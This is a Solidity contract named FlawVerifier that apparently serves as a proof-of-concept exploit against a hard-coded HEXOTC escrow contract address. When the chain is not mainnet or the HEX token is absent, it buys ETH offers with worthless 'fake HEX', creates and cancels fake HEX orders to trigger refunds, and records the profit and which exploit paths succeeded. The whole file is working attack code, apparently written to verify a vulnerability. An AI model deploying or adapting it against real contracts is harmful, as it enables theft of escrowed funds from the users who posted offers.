// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IHEXOTC {
    function last_offer_id() external view returns (uint256);
    function offers(uint256 id)
        external
        view
        returns (
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            bytes32 offerId,
            uint256 escrowType
        );

    function buyETH(uint256 id) external returns (bool);
    function offerHEX(uint256 payAmt, uint256 buyAmt) external returns (uint256 id);
    function cancel(uint256 id) external returns (bool success);
}

contract FlawVerifier {
    address internal constant TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address internal constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    uint256 internal constant EXPECTED_CHAIN_ID = 1;

    uint256 internal constant PATH_DRAIN_ETH_WITH_FAKE_HEX = 1 << 0;
    uint256 internal constant PATH_CREATE_FAKE_HEX_ORDER = 1 << 1;
    uint256 internal constant PATH_FAKE_REFUND_OR_SETTLEMENT = 1 << 2;
    uint256 internal constant RECENT_OFFER_SCAN_LIMIT = 64;

    bool private _executed;
    bool private _hypothesisValidated;
    bool private _hypothesisRefuted;
    uint256 private _exploitPathMask;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    receive() external payable {}

    function execute() external returns (uint256) {
        return _execute();
    }

    function run() external returns (uint256) {
        return _execute();
    }

    function exploit() external returns (uint256) {
        return _execute();
    }

    function executed() external view returns (bool) {
        return _executed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function hypothesisRefuted() external view returns (bool) {
        return _hypothesisRefuted;
    }

    function exploitPathMask() external view returns (uint256) {
        return _exploitPathMask;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _execute() internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }

        _executed = true;
        _profitToken = address(0);

        uint256 balanceBefore = address(this).balance;

        if (!_wrongChainHexPreconditionHolds() || TARGET.code.length == 0) {
            _hypothesisRefuted = true;
            return 0;
        }

        uint256 ethOfferId = _findRecentOffer(1);
        if (ethOfferId != 0) {
            (bool buyOk,) = TARGET.call(abi.encodeWithSelector(IHEXOTC.buyETH.selector, ethOfferId));
            if (buyOk && address(this).balance > balanceBefore) {
                _exploitPathMask |= PATH_DRAIN_ETH_WITH_FAKE_HEX;
            }
        }

        (uint256 lastOfferBefore, bool beforeOk) = _safeLastOfferId();
        if (beforeOk) {
            (bool offerOk,) = TARGET.call(abi.encodeWithSelector(IHEXOTC.offerHEX.selector, 1, 1));
            if (offerOk) {
                (uint256 lastOfferAfter, bool afterOk) = _safeLastOfferId();
                if (afterOk && lastOfferAfter > lastOfferBefore) {
                    _exploitPathMask |= PATH_CREATE_FAKE_HEX_ORDER;
                    (bool cancelOk,) = TARGET.call(abi.encodeWithSelector(IHEXOTC.cancel.selector, lastOfferAfter));
                    if (cancelOk) {
                        _exploitPathMask |= PATH_FAKE_REFUND_OR_SETTLEMENT;
                    }
                }
            }
        }

        _profitAmount = address(this).balance - balanceBefore;
        _hypothesisValidated = _exploitPathMask != 0;
        _hypothesisRefuted = _exploitPathMask == 0;
        return _profitAmount;
    }

    function _wrongChainHexPreconditionHolds() internal view returns (bool) {
        return block.chainid != EXPECTED_CHAIN_ID || HEX.code.length == 0;
    }

    function _findRecentOffer(uint256 escrowType) internal view returns (uint256) {
        (uint256 lastId, bool ok) = _safeLastOfferId();
        if (!ok || lastId == 0) {
            return 0;
        }

        uint256 scanned;
        for (uint256 id = lastId; id > 0 && scanned < RECENT_OFFER_SCAN_LIMIT; --id) {
            (bool offerOk, uint256 payAmt, uint256 buyAmt, uint64 timestamp, uint256 foundEscrowType) = _safeOffer(id);
            if (offerOk && timestamp != 0 && payAmt != 0 && buyAmt != 0 && foundEscrowType == escrowType) {
                return id;
            }
            unchecked {
                ++scanned;
            }
        }

        return 0;
    }

    function _safeLastOfferId() internal view returns (uint256 value, bool ok) {
        (ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IHEXOTC.last_offer_id.selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        } else {
            ok = false;
        }
    }

    function _safeOffer(uint256 id)
        internal
        view
        returns (
            bool ok,
            uint256 payAmt,
            uint256 buyAmt,
            uint64 timestamp,
            uint256 escrowType
        )
    {
        (ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IHEXOTC.offers.selector, id));
        if (!ok || data.length < 192) {
            return (false, 0, 0, 0, 0);
        }

        (payAmt, buyAmt, , timestamp, , escrowType) = abi.decode(data, (uint256, uint256, address, uint64, bytes32, uint256));
    }
}
